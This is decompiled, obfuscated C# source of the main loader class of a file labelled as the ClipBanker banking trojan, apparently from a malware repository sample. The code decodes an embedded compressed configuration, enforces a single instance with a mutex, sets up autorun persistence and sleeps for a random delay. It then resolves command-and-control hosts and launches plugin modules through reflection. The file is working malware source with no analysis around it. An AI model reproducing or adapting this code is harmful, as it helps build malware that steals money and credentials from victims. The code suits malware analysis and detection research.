// Decompiled with JetBrains decompiler
// Type: 21L.73h
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u0031xm;
using \u00321L;
using \u003544;
using \u00354X;
using \u0035J5;
using \u0037q2;
using \u00386V;
using crD;
using H16;
using l6z;
using MHD;
using P7S;
using System;
using System.Collections.Generic;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u00321L
{
  internal static class \u00373h
  {
    private static void Kp2([In] Dictionary<string, object> obj0)
    {
      ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      Ej4.\u0038Z2((bool) obj0["DBG"], (bool) obj0["LDTM"], Convert.ToInt32(obj0["BCS"]), (string) obj0["TAG"], new Version(4, 5, 22).ToString());
      Ej4.\u003567((string) obj0["MUTEX"]);
      GC.Collect();
    }

    internal static void \u00331R()
    {
      Ej4.b79();
      Ej4.\u0038R6 = aw8.P38(xY7.\u0037bI(aw8.\u0032T2(\u00373h.LBE()))).ToCharArray();
      Dictionary<string, object> dictionary1 = new string(Ej4.\u0038R6).dtU<Dictionary<string, object>>();
      Dictionary<string, string> dictionary2 = new string(Ej4.\u0038R6).dtU<Dictionary<string, string>>();
      \u00373h.Kp2(dictionary1);
      \u00373h.\u003181(dictionary1);
      Zk3.\u003124(dictionary2);
      \u00373h.fhU(dictionary1);
      \u00373h.\u0031Y3();
      \u00373h.\u0031p3(dictionary1, dictionary2);
    }

    private static void \u003181([In] Dictionary<string, object> obj0)
    {
      string str = aw8.\u00311f((string) obj0["MUTEX"]);
      for (int index = 0; index < int.MaxValue && !xY7.\u0036Ub(str); ++index)
      {
        if (index >= 15)
          Environment.Exit(0);
        Thread.Sleep(500);
      }
    }

    private static void fhU([In] Dictionary<string, object> obj0)
    {
      try
      {
        if ((bool) obj0["AD"])
          return;
        kcG.\u0035x4(Convert.ToInt32(obj0["AUR"]));
      }
      catch (Exception ex)
      {
        j6f.JkW("Install", ex.Message);
      }
    }

    private static string LBE() => string.Copy("H4sIAAAAAAAEAF2T3XaiMBSFH2huAJfTelmpQdI2DigBcifRaiAgHS3+PP2EstM19ko+9j77nEPihKeba9wsVJRE6qxCh2V5MF2+7hIldRwUnXDklXuScxX+Dv1kRarwmKDm0Umm1H/VvJFOW4ZfWrh8tywntfjUnhyzJpSXpXDpfGMysopmeUcD2V68XJ3Jd72MR8WBNYXmtSx/1OwvQdG2mTjqWtzX1LJjnmzj+s5/IqlwfmScSC0bHhQ6Ht7fLmle9xm6kV08ku3+PqNk93xzTS/x413ffzOSNxLIu7lYJtqTV3TI+O5Fgs0+TrfONCu0nhdHkq4d8z3OZudu7ImW+tkx8eSR1KLP15d0XZuZm3G6vk362iyvWCM1G2062uRaZPnN1DxQtVCyip8ZN+fov/0OVcL783gqF+rNjfz+nNi82Iu690Wz/9mZ8dnl6+y2sXbNbom45iNRT0ex+/S8ulRanlw/JTHnbKKT57jq78LAJkdF1Cl8Vkdz6uwq6uQ++4gezLN/aqLsxVGHMpyTGe/v18TMujN79bvl/a7m9wF8DQcuwQL6CXyGrsEH6E904BV4Bx6DH20++B16Cv5l88Fb6AtwDX0J/gT74Ap8w3x/wQR6Cy7BR3Bs50M/bucBB+AD/FPwHqzBH+DM3oPInNFUf/0X+zupznqhzm40PJM/A+sNOB+Yv8ELv+YDuwvUrwfmVl/CT1EPPwETyxF01Lsh9C04Qx508g5/inzMS8Dc9mOof8F86Mdtvp3P5qMfh58U0MHa7m/7w0+g8xXY5hu/u+3vdkLdaEWv23/MworqTAUAAA==").Trim();

    private static void \u0031Y3()
    {
      try
      {
        Zk3.\u00367K.ForEach(\u00373h.PoW.\u003C\u003E9__5_0 ?? (\u00373h.PoW.\u003C\u003E9__5_0 = new Action<object[]>(\u00373h.PoW.\u003C\u003E9.\u0035jP)));
      }
      catch
      {
      }
    }

    private static void yE8(
      [In] Dictionary<string, object> obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3,
      [In] string obj4)
    {
      \u00373h.\u0037Z4 obj = new \u00373h.\u0037Z4();
      obj.Kx3 = obj1;
      try
      {
        Zk3.\u003494.ForEach(new Action<object[]>(obj.FSt));
        Zk3.\u003494 = new List<object[]>();
      }
      catch
      {
      }
      xY7.\u0031cL(obj.Kx3, obj2, obj3, obj4);
      if (!(bool) obj0["AS"])
        return;
      \u0033zU.iN2(obj.Kx3, obj2, obj3, obj4);
    }

    private static void \u0031p3([In] Dictionary<string, object> obj0, [In] Dictionary<string, string> obj1)
    {
      Dictionary<string, string> dictionary = aw8.P38(xY7.\u0037bI(aw8.\u0032u1(aw8.\u0032T2("H4sIAAAAAAAEALPU1dFwyI/3VNPV8XHQ0E7SzlCMsovSTLXWs9aO09XSsFbWqslLUAlwtAxOqVN1qNFMsUtSUK3z07J28UtIN66xsXDwj3NSTFHIyPU083TQ8KSKOcFAc+pSAXsntqGcAAAA"), obj1["SCRT"].dtU<Dictionary<string, string>>()))).dtU<Dictionary<string, string>>();
      Thread.Sleep(new \u003192().Z87(100, 10000));
      if (dictionary["T"] == "1")
      {
        string[] strArray = \u00382l.rjO(dictionary["DCL"], false).Split('.');
        if (strArray == null)
        {
          xY7.\u0038n2();
          Environment.Exit(0);
          return;
        }
        dictionary = aw8.P38(xY7.\u0037bI(aw8.\u0032u1(aw8.P38(strArray[0]), aw8.P38(xY7.\u0037bI(strArray[1])).dtU<Dictionary<string, string>>()))).dtU<Dictionary<string, string>>();
      }
      string str1;
      string str2;
      string str3;
      string str4;
      if (!g79.\u0036vg(dictionary["H1"], dictionary["H2"], out str1, out str2, out str3, out str4))
      {
        xY7.\u0038n2();
        Environment.Exit(0);
      }
      else
      {
        Zk3.j7Z(str1, str3, str2, str4);
        \u00373h.yE8(obj0, str1, str3, str2, str4);
        \u00373h.CY1(str1, str3, str2, str4);
      }
    }

    private static void CY1([In] string obj0, [In] string obj1, [In] string obj2, [In] string obj3)
    {
      g79.\u003368(obj0, obj1, obj2, obj3);
      Thread.Sleep(100);
      g79.EC5(obj0, obj1, obj2, obj3);
    }

    private sealed class \u0038hk
    {
      public object[] \u003893;

      internal void rkD()
      {
        try
        {
          ((MethodBase) this.\u003893[0]).Invoke(this.\u003893[1], new object[3]
          {
            (object) Ej4.R6b,
            (object) Ej4.\u0034Jt,
            (object) Ej4.\u0033Go
          });
        }
        catch
        {
        }
      }
    }

    [Serializable]
    private sealed class PoW
    {
      public static readonly \u00373h.PoW \u003C\u003E9 = new \u00373h.PoW();
      public static Action<object[]> \u003C\u003E9__5_0;

      internal void \u0035jP([In] object[] obj0) => new Thread(new ThreadStart(new \u00373h.\u0038hk()
      {
        \u003893 = obj0
      }.rkD)).Start();
    }

    private sealed class \u0037Z4
    {
      public string Kx3;

      internal void FSt([In] object[] obj0) => new Thread(new ThreadStart(new \u00373h.J41()
      {
        \u003936 = this,
        H79 = obj0
      }.\u0032WP)).Start();
    }

    private sealed class J41
    {
      public object[] H79;
      public \u00373h.\u0037Z4 \u003936;

      internal void \u0032WP()
      {
        try
        {
          ((MethodBase) this.H79[0]).Invoke(this.H79[1], new object[4]
          {
            (object) Ej4.R6b,
            (object) Ej4.\u0034Jt,
            (object) Ej4.\u0033Go,
            (object) this.\u003936.Kx3
          });
        }
        catch
        {
        }
      }
    }
  }
}
